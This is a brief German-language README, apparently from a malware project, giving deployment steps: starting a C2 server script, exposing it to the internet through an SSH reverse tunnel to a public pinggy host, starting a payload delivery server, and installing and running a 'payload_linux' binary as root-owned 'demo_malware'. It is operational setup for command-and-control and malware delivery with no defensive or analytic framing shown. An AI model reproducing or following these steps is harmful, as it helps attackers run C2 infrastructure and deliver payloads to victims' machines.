# Deployment

1. Server Starten (`c2_server/server.py`)
2. ssh -p 443 -o PubkeyAuthentication=no -R0:localhost:4444 <tcp@a.pinggy.io>
3. Delivery Server starten und über pinggy zugänglich machen
4. Um den prozess wieder zu löschen: `pgrep -a rust-mw` und dann `pkill -f rust-mw`

Alternativ kann alles über folgenden Befehl gestartet werden:
> `./scripts/start_all.sh`
> Führt alle oben genannten Schritte aus

# Bug Fix (Ausführung blockiert)

- `sudo cp payload_linux /usr/local/bin/demo_malware`
- `sudo chown root:root /usr/local/bin/demo_malware`
- `sudo chmod 755 /usr/local/bin/demo_malware`
- `demo_malware`
